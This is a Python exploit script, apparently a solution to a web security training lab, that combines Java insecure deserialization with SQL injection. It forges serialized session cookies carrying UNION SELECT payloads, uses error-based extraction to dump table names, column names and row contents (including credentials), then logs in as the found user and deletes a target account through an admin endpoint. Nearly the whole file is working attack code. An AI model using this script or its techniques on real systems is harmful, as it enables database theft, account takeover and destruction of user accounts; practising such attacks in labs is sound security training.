import requests
import sys
import urllib3, urllib.parse
from bs4 import BeautifulSoup
import os
import subprocess
import re
import ast

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

JAVA_DIR = os.path.join(os.path.dirname(__file__), 'serialization-examples', 'java', 'solution')


def generate_payload(sql_injection):
    main_java = os.path.join(JAVA_DIR, 'Main.java')
    with open(main_java, 'r', encoding='utf-8') as f:
        code = f.read()
        new_code = re.sub(
            r'new ProductTemplate\(".*?"\)',
            f'new ProductTemplate("{sql_injection}")',
            code
        )
    with open(main_java, 'w', encoding='utf-8') as f:
        f.write(new_code)
    subprocess.run(['javac', 'Main.java', 'data/productcatalog/ProductTemplate.java'], cwd=JAVA_DIR, capture_output=True)
    result = subprocess.run(['java', 'Main'], cwd=JAVA_DIR, capture_output=True, text=True)
    return result.stdout.strip()

def get_serialized_object(payload):
    return payload.split('Serialized object: ')[1].split('\n')[0]

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def count_num_col(s, url):
    for i in range(1, 20):
        sql_injection = f"' UNION SELECT {', '.join(["NULL"] * i)} FROM information_schema.tables--"
        payload = generate_payload(sql_injection)
        s.cookies['session'] = get_serialized_object(payload)
        r = s.get(url)
        if 'data.productcatalog.ProductTemplate' in r.text and r.status_code == 500:
            print(f'[+] Count number of columns = {i}')
            return i
    print('[-] Failed to count number of column')
    sys.exit(-1)

def detect_col_type(s, url, num_column):
    columns = ['NULL'] * num_column
    str_col, int_col = [], []
    for i in range(num_column):
        columns[i] = "'a'"
        sql_injection = f"' UNION SELECT {', '.join(columns)} FROM information_schema.tables--"
        payload = generate_payload(sql_injection)
        s.cookies['session'] = get_serialized_object(payload)
        r = s.get(url)
        if 'data.productcatalog.ProductTemplate' in r.text and r.status_code == 500:
            str_col.append(i)
        elif 'integer' in r.text and r.status_code == 500:
            int_col.append(i)
        columns[i] = 'NULL'
    if not len(str_col) and len(int_col):
        print('[-] Can\'t detect column data type')
        sys.exit(-1)
    return str_col, int_col

def get_all_name(html_content):
    names = html_content.split('&quot;')[1]
    names = names.split(',')
    return names

def list_all_tables(s, url, columns):
    sql_injection = f"' UNION SELECT {', '.join(columns)} FROM information_schema.tables--"
    payload = generate_payload(sql_injection)
    s.cookies['session'] = get_serialized_object(payload)
    r = s.get(url)
    tables = get_all_name(r.text)
    print(f'[+] List of tables: {tables}')

def list_columns_of_table(s, url, columns, table_name):
    sql_injection = f"' UNION SELECT {', '.join(columns)} FROM information_schema.columns WHERE TABLE_NAME = '{table_name}'--"
    payload = generate_payload(sql_injection)
    s.cookies['session'] = get_serialized_object(payload)
    r = s.get(url)
    columns = get_all_name(r.text)
    print(f'[+] List of columns: {columns}')

def list_columns_content(s, url, table_name, columns, list_columns):
    sql_injection = f"' UNION SELECT {', '.join(columns)} FROM {table_name}--"
    payload = generate_payload(sql_injection)
    s.cookies['session'] = get_serialized_object(payload)
    r = s.get(url)
    content = r.text.split('&quot;')[1]
    parts = content.split('~')
    rows = zip(*[p.split(',') for p in parts])
    for row in rows:
        print(dict(zip(list_columns, row)))

def delete_acc(s, url, username):
    delete_url = url + '/admin/delete'
    payload = { 'username': username }
    r = s.get(delete_url, data=payload)

    if 'User deleted successfully!' in r.text:
        print('[+] Successful solved lab')
    else:
        print('[-] Fail to exploit lab')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    num_column = count_num_col(s, url)
    str_col, int_col = detect_col_type(s,url, num_column)
    print(f'[+] List of columns is string type: {str_col}')
    print(f'[+] List of columns is integer type: {int_col}')
    print()

    while True:
        print('1. List all tables')
        print('2. List columns of table')
        print('3. List columns content')
        print('4. Login by credential found in response')
        print('5. Delete target account')
        op = str(input('Choose option: '))
        if op == '1':
            columns = ['NULL'] * num_column
            if len(int_col): columns[int_col[0]] = "CAST(string_agg(table_name, ',') as int)"
            print(f'Columns: {columns}')

            list_all_tables(s, url, columns)
        elif op == '2':
            table_name = input('Which table: ')
            columns = ['NULL'] * num_column
            if len(int_col): columns[int_col[0]] = "CAST(string_agg(column_name, ',') as int)"
            print(f'Columns: {columns}')
            
            list_columns_of_table(s, url, columns, table_name)
        elif op == '3':
            table_name = input('Which table: ')
            list_columns = ast.literal_eval(input(f'Array of columns you want to know: '))
            inner = " || '~' || ".join([f"string_agg({col}, \',\')" for col in list_columns])
            columns = ['NULL'] * num_column
            if len(int_col): columns[int_col[0]] = f'CAST({inner} as int)'
            print(f'Columns: {columns}')

            list_columns_content(s, url, table_name, columns, list_columns)
        elif op == '4':
            username = input('Username: ')
            password = input('Password: ')
            login_acc(s, url, '/login', username, password)
        elif op == '5':
            target_username = input('Target username: ')
            delete_acc(s, url, target_username)
        else:
            print('[-] Invalid option')

        check_solved_lab(s, url)
        print()

if __name__ == '__main__':
    main()